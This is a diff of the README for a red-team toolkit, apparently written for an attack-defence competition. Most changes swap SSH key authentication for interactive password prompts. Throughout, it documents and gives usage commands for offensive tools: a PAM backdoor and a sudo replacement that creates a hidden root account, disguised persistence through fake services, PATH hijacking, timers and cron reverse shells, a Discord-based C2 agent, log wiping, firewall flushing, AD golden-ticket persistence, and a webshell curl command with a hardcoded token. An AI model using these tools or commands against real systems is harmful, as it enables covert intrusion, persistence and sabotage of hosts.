@@ -28,7 +28,7 @@
 ├── infinite-users.sh
 ├── install-fish.sh
 ├── lock-busybox.sh
-├── loot/                              ← captured artifacts (SSH keys, etc.)
+├── loot/                              ← captured artifacts
 ├── no-apt.sh
 ├── no-audit.sh
 ├── no-selinux.sh
@@ -65,28 +65,28 @@
 | tool name | functionality |
 | --- | --- |
 | **Orchestrators** | |
-| let-the-madness-begin.sh | master deployment script — generates an ephemeral root SSH keypair, then runs a 9-step deployment wave across all Linux hosts: root-ssh → DiscordGo C2 → fake w/who → nuke-journal → dnsmasq sinkhole → infinite-users → PAM backdoor → break-net-tools → sudo-biNOry; prints a receipt with OK/PARTIAL/FAIL per wave — usage: `./let-the-madness-begin.sh [-u user] [-p pass] [-i key] [--dry-run]` |
+| let-the-madness-begin.sh | master deployment script — runs a 9-step deployment wave across all Linux hosts: root-ssh → DiscordGo C2 → fake w/who → nuke-journal → dnsmasq sinkhole → infinite-users → PAM backdoor → break-net-tools → sudo-biNOry; prompts for SSH password interactively; prints a receipt with OK/PARTIAL/FAIL per wave — usage: `./let-the-madness-begin.sh [-u user] [--dry-run]` |
 | mass-deploy.sh | fan-out wrapper over rt-ssh.sh — fires one job per Linux host concurrently (default: all 9 at once), captures per-host output, prints a pass/fail summary table; host list baked in (internal IPs 10.10.10.101–109, Linux only); supports `--dry-run` to preview commands, `--hosts FILE` to override the target list, `-j N` to cap parallelism — see Mass Deployment section below |
-| rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; supports root SSH, sudo with/without password, and user-level (no sudo) modes; auto-generates ed25519 keypairs for `root-ssh install` and saves them to `loot/` — see Deployment section below |
-| teardown.sh | reverse of let-the-madness-begin — removes ALL installed tools from all Linux hosts in safe dependency order (networking restoration first → audit/selinux → sabotage → chaos → auth backdoors → persistence); continues on individual failures, prints a receipt — usage: `./teardown.sh [-u user] [-p pass] [-i key] [--dry-run]` |
+| rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; supports root SSH, sudo with/without password, and user-level (no sudo) modes; prompts for SSH/sudo password interactively (or reads `RT_SSH_PASS` env var for scripted use) — see Deployment section below |
+| teardown.sh | reverse of let-the-madness-begin — removes ALL installed tools from all Linux hosts in safe dependency order (networking restoration first → audit/selinux → sabotage → chaos → auth backdoors → persistence); continues on individual failures, prints a receipt — usage: `./teardown.sh [-u user] [--dry-run]` |
 | **Pre-flight / Testing** | |
-| check-hosts.sh | validates SSH connectivity and sudo access across all 9 Linux targets in parallel, prints a color-coded table with HOST, IP, SSH status, SUDO status, USER, KERNEL — usage: `./check-hosts.sh [-u user] [-p pass] [-i key] [--sudo]` |
-| test-all-on-vm1.sh | test harness: runs every remote tool through pre-clean → install → status → remove on a single target and prints a PASS/WARN/FAIL receipt; useful for validating the toolkit against a fresh VM before competition — usage: `./test-all-on-vm1.sh [-t user@host] [-p pass] [-i keyfile]` |
+| check-hosts.sh | validates SSH connectivity and sudo access across all 9 Linux targets in parallel, prints a color-coded table with HOST, IP, SSH status, SUDO status, USER, KERNEL; prompts for password interactively — usage: `./check-hosts.sh [-u user] [--sudo]` |
+| test-all-on-vm1.sh | test harness: runs every remote tool through pre-clean → install → status → remove on a single target and prints a PASS/WARN/FAIL receipt; prompts for password interactively — usage: `./test-all-on-vm1.sh [-t user@host]` |
 | dessabox | unified Python3 CLI for the whole toolkit — category-based command dispatch (`persist`, `deploy`, `sabotage`, `webshell`, `net`, `chaos`, `info`) routing to underlying shell scripts |
 | one-liners.sh | printable cheatsheet — run to print, nothing executes; covers users, sudoers, SSH, firewall, SUID/privesc, cron, reverse shells, recon, network, files, services, and log manipulation |
 | **Persistence** | |
-| root-ssh.sh | enables direct root SSH login — patches sshd_config for `PermitRootLogin yes`, optionally injects SSH public key into `/root/.ssh/authorized_keys` and/or sets a root password; backs up original config; generated keys saved to `loot/` — usage: `install [--key "..."] [--pass PASSWORD] \| remove \| status` |
+| root-ssh.sh | enables direct root SSH login — patches sshd_config for `PermitRootLogin yes` and `PasswordAuthentication yes`; backs up original config — usage: `install [--pass PASSWORD] \| remove \| status` |
 | shadow-crond.sh | copies busybox to a hidden path so ps shows a system-looking name, runs busybox crond with a custom spool dir invisible to crontab -l, hides behind a systemd-timesyncd-helper service — edit /var/cache/.syspkg/tabs/root to change payload — **must run BEFORE lock-busybox.sh**; install now detects if the found busybox is the lock-busybox gated wrapper and automatically falls back to /var/cache/.syspkg/busybox.real — usage: `install\|remove\|status` |
-| evil-timer | poison-timer.sh is the real one — takes `--key "ssh-ed25519 ..."` to bake SSH key re-injection into the payload alongside firewall flush, SUID bash drop, and watchdog restarts; state saved to /var/cache/.syspkg/poison-timer.state so `remove` always targets exactly what was installed rather than re-guessing; all artefacts backdated 2020-04-15; deploy-evil-timer.sh deploys the python2-certbot user-level timer (no root) — usage: `install [--target <timer>] [--interval <min>] [--key "..."] \| remove \| status \| list` |
-| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: SSH key injection into all homedirs, firewall flush, watchdog restart of shadow-crond — all artefacts backdated to 2020-04-15 — usage: `install [--key "..."] \| remove \| status` |
-| path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: ssh-key / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--key "..."] [--payload 1\|2\|3] \| remove \| status` |
+| evil-timer | poison-timer.sh is the real one — payload includes firewall flush, SUID bash drop, and watchdog restarts; state saved to /var/cache/.syspkg/poison-timer.state so `remove` always targets exactly what was installed rather than re-guessing; all artefacts backdated 2020-04-15; deploy-evil-timer.sh deploys the python2-certbot user-level timer (no root) — usage: `install [--target <timer>] [--interval <min>] \| remove \| status \| list` |
+| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: firewall flush, watchdog restart of shadow-crond — all artefacts backdated to 2020-04-15 — usage: `install \| remove \| status` |
+| path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: (noop) / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--payload 1\|2\|3] \| remove \| status` |
 | vim-persist.sh | injects a vimscript autocmd into all .vimrc files that flushes iptables and nftables silently on every vim open, also hits /etc/vim/vimrc.local for system-wide coverage on users without a .vimrc — skips greyteam/ansible/scoring users, /etc/vim/vimrc.local respects the same whitelist |
 | **Auth Backdoors** | |
 | pam-backdoor | compiles pam_audit_log.so (looks like a legit audit stub) and prepends `auth sufficient` to /etc/pam.d/common-auth, lets you auth as any user with the magic password without touching real credentials; self-contained (C source embedded as heredoc, no companion .c needed); PAM dir detected via `find` on pam_unix.so (no python3 dependency); preflight checks gcc and libpam0g-dev headers; .so timestamped to match existing PAM modules; idempotent — usage: `install\|remove\|status` |
 | infinite-users.sh | symlinks nologin to bash so any service account can get a shell, writes a sudoers.d entry giving all those accounts full nopasswd root, and sets a known password on every unlocked account so they're immediately SSHable — default password `rt2025!delta`, override with positional arg: `infinite-users 'mypass'` |
 | sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates backdoor user `sudoer` (full nopasswd root) on first invocation, then passes through to the real sudo — real binary backed up to `/usr/bin/sudo.based`; `remove` restores original and deletes sudoer account — usage: `install\|remove\|status` |
 | **C2** | |
-| DiscordGo/ | C2 agent deployment system — pre-compiled Go agents (Linux + Windows) that communicate over Discord webhooks; `deploy-discordgo.sh` handles single-target or CSV-based bulk deploy; agents dropped to `/usr/local/sbin/.sysupdate` (Linux) by default; reads `scripts/hosts.csv` for bulk mode — usage: `./DiscordGo/deploy-discordgo.sh [-u user] [-p pass] [-i key] [-j N] [--linux-only\|--windows-only] [--dry-run]` |
+| DiscordGo/ | C2 agent deployment system — pre-compiled Go agents (Linux + Windows) that communicate over Discord webhooks; `deploy-discordgo.sh` handles single-target or CSV-based bulk deploy; agents dropped to `/usr/local/sbin/.sysupdate` (Linux) by default; reads `scripts/hosts.csv` for bulk mode; prompts for password interactively — usage: `./DiscordGo/deploy-discordgo.sh [-u user] [-j N] [--linux-only\|--windows-only] [--dry-run]` |
 | **Anti-forensics / Sabotage** | |
 | alias-bashrc.sh | searches for .bashrc files and injects a sudo() shell function that silently flushes nftables every time sudo is run, whether the user confirms or cancels — skips greyteam/ansible/scoring users |
 | break-net-tools.sh | breaks curl, wget, and git via binary shadowing + proxy poisoning + shell function injection, all reversible, local git ops still work so scoring doesnt break — usage: `install\|remove\|status` |
@@ -105,11 +105,11 @@
 | dotify.sh | renames all files in a target directory by prepending a dot (`.`), making them hidden on Unix — usage: `./dotify.sh <directory>` |
 | install-fish.sh | installs Fish shell and creates a `fish-user` account with Fish as default shell — one-shot, needs root |
 | yay-install.sh | installs yay, probably doesnt work on ubuntu but whatever |
-| loot/ | artifact storage directory — SSH keys generated by root-ssh and path-hijack are auto-saved here with timestamps |
-| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: SSH key injection into all homedirs, firewall flush, watchdog restart of shadow-crond — all artefacts backdated to 2020-04-15 — usage: `install [--key "..."] \| remove \| status` |
-| path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: ssh-key / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--key "..."] [--payload 1\|2\|3] \| remove \| status` |
+| loot/ | artifact storage directory |
+| ureadahead-persist.sh | persistence disguised as the `ureadahead` boot-prefetch service (real Ubuntu package in 14.04–20.04, removed in 22.04/24.04 — looks like an upgrade leftover), installs `/sbin/ureadahead` wrapper + hidden payload at `/lib/ureadahead/pack`, fires at boot + every 15 min via ExecStartPost loop, payload: firewall flush, watchdog restart of shadow-crond — all artefacts backdated to 2020-04-15 — usage: `install \| remove \| status` |
+| path-hijack.sh | PATH directory injection — drops transparent command wrappers into a dir that lands first in `$PATH`; every time a user runs a hijacked command the wrapper re-asserts persistence silently then execs the real binary; three levels: **user** (`~/.local/bin` — already auto-prepended by Ubuntu 24.04's `~/.profile`, zero PATH modification, no root needed), **system** (`/etc/profile.d/10-update-manager.sh` drop-in for all users, disguised as real Ubuntu package), **cron** (prepends to `/etc/crontab` PATH to catch root cron jobs calling commands without full paths); payload levels 1–3: (noop) / +suid-bash / +fw-flush+watchdogs — usage: `scan \| install [--level user\|system\|cron] [--payload 1\|2\|3] \| remove \| status` |
 | mass-deploy.sh | fan-out wrapper over rt-ssh.sh — fires one job per Linux host concurrently (default: all 9 at once), captures per-host output, prints a pass/fail summary table; host list baked in (internal IPs 10.10.10.101–109, Linux only); supports `--dry-run` to preview commands, `--hosts FILE` to override the target list, `-j N` to cap parallelism — see Mass Deployment section below |
-| rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; supports root SSH, sudo with/without password, and user-level (no sudo) modes — see Deployment section below |
+| rt-ssh.sh | SSH deployment wrapper — base64-encodes each tool on Kali, SSHs to target, decodes into `/dev/shm` (RAM tmpfs, never touches disk), executes, wipes; no source code left on target machines; prompts for SSH/sudo password interactively — see Deployment section below |
 
 ### Deployment notes
 
@@ -119,8 +119,7 @@
 - **idempotent scripts** — no-apt.sh, no-audit.sh, no-selinux.sh all exit early if already deployed; no-audit.sh and no-selinux.sh now also have `remove` and `status` subcommands matching the rest of the toolkit
 - **shared hidden dir** — all scripts use `/var/cache/.syspkg/` for backups and binaries (chmod 700); poison-timer state is at `/var/cache/.syspkg/poison-timer.state`
 - **pam-backdoor is now self-contained** — C source embedded as heredoc; PAM dir detected via `find` on pam_unix.so (no python3 dependency); gcc and libpam0g-dev headers checked before attempting compile
-- **infinite-users + SSH key injection** — ureadahead-persist and poison-timer inject keys into ALL UID≥1000 home dirs including nologin-shelled accounts; after infinite-users runs those accounts have bash and the key is already there
-- **password-only targets** — use `-p PASS` in rt-ssh.sh; this feeds both SSH login (via sshpass) and remote `sudo -S` from one flag; override sudo password separately with `-S` if needed
+- **password-only auth** — all tools prompt for the SSH/sudo password interactively. No SSH keys are used. For scripted/parallel use (mass-deploy, let-the-madness-begin, teardown), the password is prompted once and passed to child processes via `RT_SSH_PASS`/`RT_SUDO_PASS` environment variables
 
 ---
 
@@ -150,40 +149,38 @@ Windows boxes (`svc-smb-01`, `svc-ad-01`, `blue-win-*`) are excluded — use the
 ./mass-deploy.sh [MASS-OPTS] <tool> [tool-args...]
 
   -u, --user USER      SSH username for all hosts (default: root)
-  -p, --pass PASS      SSH password (forwarded to rt-ssh.sh -p)
-  -i, --identity FILE  SSH private key (forwarded to rt-ssh.sh -i)
   -P, --port PORT      SSH port (default: 22)
-  -S, --sudo-pass PASS Sudo password (forwarded to rt-ssh.sh -S)
       --no-sudo        Forward --no-sudo to rt-ssh.sh (use when SSH'd in as root)
   -j, --jobs N         Max parallel jobs (default: 9)
       --hosts FILE     Plain-text file of IPs to target (one per line); overrides built-in list
       --dry-run        Print the rt-ssh.sh command for each host without running it
   -v, --verbose        Forward -v to rt-ssh.sh (prints remote command on each host)
+
+  Authentication: You will be prompted to type the SSH/sudo password interactively.
+  For scripted use, set RT_SSH_PASS and RT_SUDO_PASS environment variables.
 ```
 
 ### Common usage
 
 ```bash
-export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"
-
 # Dry-run first to confirm commands
 ./mass-deploy.sh --dry-run --no-sudo shadow-crond install
 
-# Key auth, already root — shadow cron all Linux boxes
-./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo shadow-crond install
+# Already root — shadow cron all Linux boxes (will prompt for password)
+./mass-deploy.sh --no-sudo shadow-crond install
 
-# Password auth with sudo
-./mass-deploy.sh -u ubuntu -p 'S3cr3t' shadow-crond install
+# Password auth with sudo (will prompt for password)
+./mass-deploy.sh -u ubuntu shadow-crond install
 
-# ureadahead + SSH key injection on all hosts
-./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo ureadahead-persist install --key "$RT_KEY"
+# ureadahead on all hosts
+./mass-deploy.sh --no-sudo ureadahead-persist install
 
 # Limit to 4 parallel jobs
-./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo -j 4 path-hijack install --level system --key "$RT_KEY"
+./mass-deploy.sh --no-sudo -j 4 path-hijack install --level system
 
 # Target a custom subset (plain IP list, one per line)
 echo -e "10.10.10.101\n10.10.10.102" > /tmp/subset.txt
-./mass-deploy.sh --hosts /tmp/subset.txt -i ~/.ssh/rt_ed25519 --no-sudo no-audit install
+./mass-deploy.sh --hosts /tmp/subset.txt --no-sudo no-audit install
 ```
 
 ### Quick start: let-the-madness-begin.sh / teardown.sh
@@ -191,17 +188,17 @@ echo -e "10.10.10.101\n10.10.10.102" > /tmp/subset.txt
 For a full automated deployment or teardown across all hosts in one command:
 
 ```bash
-# Deploy everything (generates ephemeral SSH key, 9-step wave deployment)
-./let-the-madness-begin.sh -u ubuntu -p 'S3cr3t'
+# Deploy everything (will prompt for password)
+./let-the-madness-begin.sh -u ubuntu
 
-# Or with key auth, already root
-./let-the-madness-begin.sh -i ~/.ssh/rt_ed25519 --no-sudo
+# Already root
+./let-the-madness-begin.sh --no-sudo
 
 # Preview first
-./let-the-madness-begin.sh -i ~/.ssh/rt_ed25519 --no-sudo --dry-run
+./let-the-madness-begin.sh --no-sudo --dry-run
 
-# Tear it all down (safe dependency order)
-./teardown.sh -i ~/.ssh/rt_ed25519 --no-sudo
+# Tear it all down (safe dependency order, will prompt for password)
+./teardown.sh --no-sudo
 ```
 
 ### Recommended mass deployment order (manual)
@@ -209,19 +206,18 @@ For a full automated deployment or teardown across all hosts in one command:
 Same ordering constraints apply as single-host deployment — shadow-crond before lock-busybox:
 
 ```bash
-export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"
-md() { ./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo "$@"; }
+md() { ./mass-deploy.sh --no-sudo "$@"; }
 
 md shadow-crond install
-md ureadahead-persist install --key "$RT_KEY"
+md ureadahead-persist install
 md infinite-users install
-md path-hijack install --level system --key "$RT_KEY"
-md path-hijack install --level cron   --key "$RT_KEY"
+md path-hijack install --level system
+md path-hijack install --level cron
 md pam-backdoor install
 md lock-busybox install          # AFTER shadow-crond
 md no-audit install
 md no-selinux install
-md poison-timer install --key "$RT_KEY"
+md poison-timer install
 md no-apt install
 md break-net-tools install
 ```
@@ -231,7 +227,7 @@ md break-net-tools install
 ```bash
 for tool in shadow-crond ureadahead-persist lock-busybox pam-backdoor no-audit no-selinux path-hijack; do
     echo; echo "════ $tool ════"
-    ./mass-deploy.sh -i ~/.ssh/rt_ed25519 --no-sudo "$tool" status
+    ./mass-deploy.sh --no-sudo "$tool" status
 done
 ```
 
@@ -244,10 +240,6 @@ All tools are deployed from Kali over SSH using `rt-ssh.sh`. Scripts are base64-
 ### Prerequisites
 
 ```bash
-# on Kali — generate your deployment key if you don't have one
-ssh-keygen -t ed25519 -f ~/.ssh/rt_ed25519 -N "" -C "rt-persist"
-export RT_KEY="$(cat ~/.ssh/rt_ed25519.pub)"   # paste this into --key args below
-
 # make everything executable
 chmod +x mass-deploy.sh rt-ssh.sh *.sh evil-timer/*.sh pam-backdoor/*.sh persist/*.sh webshells/*.sh
 ```
@@ -258,32 +250,28 @@ chmod +x mass-deploy.sh rt-ssh.sh *.sh evil-timer/*.sh pam-backdoor/*.sh persist
 ./rt-ssh.sh [OPTIONS] <tool> [tool-args...]
 
   -t, --target USER@HOST   SSH target (required for remote tools)
-  -p, --pass PASS          SSH login password (uses sshpass); also used as sudo
-                           password unless -S overrides it — use this for
-                           password-only access (no key needed)
-  -i, --identity FILE      SSH private key file
   -P, --port PORT          SSH port (default: 22)
-  -S, --sudo-pass PASS     Sudo password override (if different from -p)
       --no-sudo            Don't prepend sudo (already SSH'd in as root)
   -v, --verbose            Print the remote command before running
       --list               List all available tools and exit
+
+  Authentication: You will be prompted to type the SSH/sudo password interactively.
+  For scripted use (e.g. mass-deploy.sh), set RT_SSH_PASS and optionally
+  RT_SUDO_PASS as environment variables.
 ```
 
 ### Recommended deployment order (per host)
 
 Two common starting points — pick based on what access you have.
 
-#### Starting with password-only SSH (no key yet)
+#### Password SSH (this comp's setup)
 
 ```bash
-# Set once at the top of your session
-export RT_KEY="$(cat ~/.ssh/id_ed25519.pub)"
 HOST="192.168.241.150"
 USER="user"      # SSH login user
-PASS="user"      # SSH + sudo password (same in most CTF setups)
 
-# -p handles both SSH auth (via sshpass) and sudo -S automatically
-rt() { ./rt-ssh.sh -t "${USER}@${HOST}" -p "$PASS" "$@"; }
+# rt-ssh will prompt for password on every invocation
+rt() { ./rt-ssh.sh -t "${USER}@${HOST}" "$@"; }
 
 # 1. Scan for PATH hijack opportunities
 rt path-hijack scan
@@ -295,15 +283,15 @@ rt infinite-users install
 # 3. Shadow cron — must be BEFORE lock-busybox
 rt shadow-crond install
 
-# 4. ureadahead persistence (SSH key + fw flush + watchdogs at boot + every 15 min)
-rt ureadahead-persist install --key "$RT_KEY"
+# 4. ureadahead persistence (fw flush + watchdogs at boot + every 15 min)
+rt ureadahead-persist install
 
 # 5. PATH hijack user-level (no sudo, runs as $USER)
-./rt-ssh.sh -t "${USER}@${HOST}" -p "$PASS" --no-sudo path-hijack-user install --level user --key "$RT_KEY"
+./rt-ssh.sh -t "${USER}@${HOST}" path-hijack-user install --level user
 
 # 6. PATH hijack system-wide + cron (root)
-rt path-hijack install --level system --key "$RT_KEY"
-rt path-hijack install --level cron   --key "$RT_KEY"
+rt path-hijack install --level system
+rt path-hijack install --level cron
 
 # 7. PAM backdoor — lets you auth as any user with rt2025!delta
 rt pam-backdoor install
@@ -315,8 +303,8 @@ rt lock-busybox install
 rt no-audit install
 rt no-selinux install
 
-# 10. timer persistence (re-injects SSH key + flushes FW every 10 min)
-rt poison-timer install --key "$RT_KEY"
+# 10. timer persistence (flushes FW every 10 min + SUID bash + watchdogs)
+rt poison-timer install
 
 # 11. break blue team tooling
 rt no-apt install
@@ -324,17 +312,16 @@ rt break-net-tools install
 rt pihole-sinkhole install    # blocks GitHub/CDN
 ```
 
-#### Starting with root SSH key (after initial foothold)
+#### Starting as root SSH
 
 ```bash
-export RT_KEY="$(cat ~/.ssh/id_ed25519.pub)"
 HOST="192.168.241.150"
 
-# --no-sudo because we're already root
-rt() { ./rt-ssh.sh -t "root@${HOST}" -i ~/.ssh/id_ed25519 --no-sudo "$@"; }
+# --no-sudo because we're already root (will prompt for password)
+rt() { ./rt-ssh.sh -t "root@${HOST}" --no-sudo "$@"; }
 
 rt shadow-crond install
-rt ureadahead-persist install --key "$RT_KEY"
+rt ureadahead-persist install
 rt infinite-users install   # unlock service accounts (password: rt2025!delta)
 # ... same steps 4–11 as above
 ```
@@ -345,7 +332,7 @@ These two run without sudo — systemd user units and ~/.local/bin PATH injectio
 
 ```bash
 ./rt-ssh.sh -t ubuntu@<host_ip> evil-timer install
-./rt-ssh.sh -t ubuntu@<host_ip> path-hijack-user install --level user --key "$RT_KEY"
+./rt-ssh.sh -t ubuntu@<host_ip> path-hijack-user install --level user
 ```
 
 ### Local tools (run on Kali, target the host via SSH/HTTP/Redis)
@@ -353,14 +340,14 @@ These two run without sudo — systemd user units and ~/.local/bin PATH injectio
 These scripts manage the target directly without the `rt-ssh.sh` pipe — they handle their own connections:
 
 ```bash
-# Linux host — SSH key + cron + systemd user service + SUID bash + .bashrc
-./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>
+# Linux host — cron + systemd user service + SUID bash + .bashrc (prompts for password)
+./persist/linux_persist.sh <target_ip> <user> [lhost] [lport]
 
-# Redis host — unauthenticated Redis → SSH key + cron.d write
+# Redis host — unauthenticated Redis → /etc/cron.d write
 ./persist/redis_persist.sh <target_ip>
 
-# AD (post-DA) — golden ticket + backdoor DA + AdminSDHolder + DNS
-./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>
+# AD (post-DA) — golden ticket + backdoor DA + AdminSDHolder + DNS (prompts for password)
+./persist/ad_persist.sh <dc_ip> <domain.local> Administrator [lhost]
 
 # Windows — scheduled task + reg Run + WMI event sub + VBS startup + hidden service
 #   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
@@ -376,7 +363,7 @@ These scripts manage the target directly without the `rt-ssh.sh` pipe — they h
 TARGET="root@<host_ip>"
 for tool in shadow-crond nuke-journal ureadahead-persist lock-busybox poison-timer pam-backdoor no-audit no-selinux path-hijack; do
     echo "=== $tool ==="
-    ./rt-ssh.sh -t $TARGET $tool status 2>/dev/null || true
+    ./rt-ssh.sh -t "$TARGET" "$tool" status 2>/dev/null || true
 done
 ```
 
@@ -385,9 +372,8 @@ done
 | Secret | Default | Used by |
 |--------|---------|---------|
 | RT token | `rt2025!delta` | busybox gate (`RT_TOK`), PAM backdoor, PHP webshell, infinite-users account password |
-| SSH key | generate per op | ureadahead-persist, poison-timer, path-hijack, linux_persist |
 
-**Change both before deployment** — especially if competing teams can read each other's tooling.
+**Change the token before deployment** — especially if competing teams can read each other's tooling.
 
 ```bash
 # find every hardcoded token and replace before deployment
@@ -404,8 +390,8 @@ grep -r "rt2025!delta" odessa/ --include="*.sh" --include="*.php" --include="*.c
 
 | Script | Targets | Methods |
 |--------|---------|---------|
-| `persist/linux_persist.sh` | any Ubuntu host | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
-| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
+| `persist/linux_persist.sh` | any Ubuntu host | cron, systemd service, SUID bash copy, .bashrc hook |
+| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → /etc/cron.d + CONFIG REWRITE |
 | `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
 | `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |
 
@@ -413,38 +399,31 @@ grep -r "rt2025!delta" odessa/ --include="*.sh" --include="*.php" --include="*.c
 
 ### linux_persist.sh
 
-Deploys 5 persistence methods in one shot against any Ubuntu host you can SSH into. SSH keys are generated automatically and stored at `~/.rt_keys/<ip>_ed25519` on Kali.
+Deploys 4 persistence methods in one shot against any Ubuntu host you can SSH into. Prompts for password interactively.
 
 ```bash
-# Basic usage — password auth, Kali IP auto-detected
-./persist/linux_persist.sh 10.10.10.101 ubuntu password
+# Basic usage — Kali IP auto-detected (will prompt for SSH password)
+./persist/linux_persist.sh 10.10.10.101 ubuntu
 
 # With explicit lhost and lport for callbacks
-./persist/linux_persist.sh 10.10.10.101 ubuntu password 10.10.10.200 4444
-
-# Key auth (pass the key as $3 — script detects it's not a password)
-./persist/linux_persist.sh 10.10.10.101 root ~/.ssh/id_ed25519
+./persist/linux_persist.sh 10.10.10.101 ubuntu 10.10.10.200 4444
 ```
 
 What it installs (each step has a `|| echo` so partial failures don't abort):
-1. SSH authorized_keys on user + root (if sudo available)
-2. Cron reverse shell (user crontab + `/etc/cron.d/sysupdate` if root)
-3. Systemd user service (`dbus-update.service`) + system service (`network-monitor.service` if root)
-4. SUID bash copy at `/var/tmp/.sysbin` (root only)
-5. `.bashrc` + `.profile` hook (fires on next interactive login)
+1. Cron reverse shell (user crontab + `/etc/cron.d/sysupdate` if root)
+2. Systemd user service (`dbus-update.service`) + system service (`network-monitor.service` if root)
+3. SUID bash copy at `/var/tmp/.sysbin` (root only)
+4. `.bashrc` + `.profile` hook (fires on next interactive login)
 
 After running:
 ```bash
-# Connect back via the generated SSH key
-ssh -i ~/.rt_keys/10.10.10.101_ed25519 ubuntu@10.10.10.101
-
 # SUID bash (if root was obtained)
 ssh ubuntu@10.10.10.101 '/var/tmp/.sysbin -p'
 ```
 
 ### redis_persist.sh
 
-Targets unauthenticated Redis — writes SSH keys and a cron reverse shell via the Redis RDB dump trick.
+Targets unauthenticated Redis — writes a cron reverse shell via the Redis RDB dump trick.
 
 ```bash
 # Unauthenticated Redis on default port
@@ -454,14 +433,15 @@ Targets unauthenticated Redis — writes SSH keys and a cron reverse shell via t
 ./persist/redis_persist.sh 10.10.10.102 6379 redispassword 10.10.10.200 4445
 ```
 
-Requires `redis-cli` on Kali (`apt install redis-tools`). Tries `/root/.ssh`, `/home/redis/.ssh`, `/var/lib/redis/.ssh` for key injection and `/etc/cron.d` for cron write (both require Redis running as root).
+Requires `redis-cli` on Kali (`apt install redis-tools`). Tries `/etc/cron.d` for cron write (requires Redis running as root).
 
 ### ad_persist.sh
 
 Run after obtaining Domain Admin credentials. Dumps all hashes, forges a golden ticket, creates a backdoor DA account, installs AdminSDHolder ACL, and injects a DNS record.
 
 ```bash
-./persist/ad_persist.sh 10.10.10.100 domain.local Administrator 'P@ssw0rd' 10.10.10.200
+# Will prompt for AD admin password interactively
+./persist/ad_persist.sh 10.10.10.100 domain.local Administrator 10.10.10.200
 ```
 
 Requires on Kali: `impacket-secretsdump`, `impacket-ticketer`, `impacket-dacledit`, and `nxc`/`netexec` (replaces `crackmapexec` on Kali 2024.1+). Script auto-detects which is installed.
@@ -657,14 +637,11 @@ tmux attach -t listeners
 ### Run commands on a remote host
 
 ```bash
-# rt-ssh.sh (recommended — no trace on disk)
+# rt-ssh.sh (recommended — no trace on disk, prompts for password)
 ./rt-ssh.sh -t root@TARGET --no-sudo shadow-crond status
 
-# plain SSH one-liner
+# plain SSH one-liner (will prompt for password)
 ssh root@TARGET 'id; hostname; cat /etc/passwd'
-
-# sshpass (password auth)
-sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no user@TARGET 'id'
 
 # via webshell
 curl 'http://TARGET/shell.php?p=rt2025!delta&c=id'
